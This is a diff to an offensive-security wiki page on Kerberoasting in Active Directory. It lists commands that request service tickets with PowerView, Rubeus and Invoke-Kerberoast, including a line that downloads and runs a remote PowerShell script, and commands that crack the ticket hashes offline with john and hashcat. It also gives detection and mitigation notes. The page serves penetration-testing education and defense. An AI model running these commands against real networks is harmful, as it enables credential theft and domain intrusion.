@@ -1,4 +1,4 @@
-
+# Kerberoast
 
 <details>
 
@@ -16,8 +16,7 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 </details>
 
-
-# Kerberoast
+## Kerberoast
 
 The goal of **Kerberoasting** is to harvest **TGS tickets for services that run on behalf of user accounts** in the AD, not computer accounts. Thus, **part** of these TGS **tickets are** **encrypted** with **keys** derived from user passwords. As a consequence, their credentials could be **cracked offline**.\
 You can know that a **user account** is being used as a **service** because the property **"ServicePrincipalName"** is **not null**.
@@ -50,14 +49,24 @@ Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current f
 
 {% code title="From Windows" %}
 ```bash
+# Powerview
 Request-SPNTicket -SPN "<SPN>" #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
+
+# Rubeus
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
+
+# Invoke-Kerberoast
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
 {% endcode %}
 
-## Cracking
+{% hint style="warning" %}
+When a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.
+{% endhint %}
+
+### Cracking
 
 ```
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
@@ -65,7 +74,7 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
 
-## Persistence
+### Persistence
 
 If you have **enough permissions** over a user you can **make it kerberoastable**:
 
@@ -77,7 +86,7 @@ You can find useful **tools** for **kerberoast** attacks here: [https://github.c
 
 If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** it because of your local time, you need to synchronise the host with the DC: `ntpdate <IP of DC>`
 
-## Mitigation
+### Mitigation
 
 Kerberoast is very stealthy if exploitable
 
@@ -98,7 +107,6 @@ Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{
 
 **More information about Kerberoasting in ired.team in** [**here** ](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)**and** [**here**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**.**
 
-
 <details>
 
 <summary><strong>Support HackTricks and get benefits!</strong></summary>
@@ -114,5 +122,3 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 **Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
 
 </details>
-
-
